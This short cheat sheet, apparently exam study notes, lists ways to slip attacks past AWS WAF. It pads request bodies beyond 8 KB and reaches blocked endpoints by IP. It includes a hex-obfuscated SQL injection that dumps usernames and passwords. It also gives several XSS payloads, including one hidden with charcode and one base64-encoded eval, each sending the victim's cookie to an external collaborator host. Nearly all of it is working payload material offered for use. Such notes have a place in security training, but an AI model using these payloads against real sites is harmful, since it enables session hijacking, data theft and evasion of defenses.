

**known techniques to bypass AWS WAF protections**

- AWS WAF only inspects the first 8,192 bytes (8 KB) of a request body meaning we can bypass its WAF by inserting 8k chars then insert the payload 

**Bypass  403**

WAF Blocked Endpoints target.com/api/v1/users/ 
- Try bypassing the waf by using the IP Adrress `<IP>/api/v1/users/`

**WAF detect attack when appending SQL**

pass the WAF, Use Burp extension **Hackvertor** to [obfuscate](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#obfuscation) the SQL Injection payload in the XML post body.

- [ ]  Use Hackvertor in Burp to hex-encode payload in XML body:
- [ ]  Replace spaces with comments: `SELECT/**/username/**/FROM/**/users`
- [ ]  Case variation: `SeLeCt`, `uNiOn`, `wHeRe`


```xml
	<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```


**Xss WAF byPasses**

```js
</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt > 

Can be interpreted as using charcode

</ScRiPt ><ScRiPt >document.write(String.fromCharCode(60, 105, 109, 103, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 99, 51, 103, 102, 112, 53, 55, 56, 121, 56, 107, 51, 54, 109, 98, 102, 56, 112, 113, 120, 54, 113, 99, 50, 110, 116, 116, 107, 104, 97, 53, 122, 46, 111, 97, 115, 116, 105, 102, 121, 46, 99, 111, 109, 63, 99, 61) + document.cookie + String.fromCharCode(34, 32, 47, 62, 60, 47, 83, 99, 114, 105, 112, 116, 62));</ScRiPt >
```

>encode - decode
```js
"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```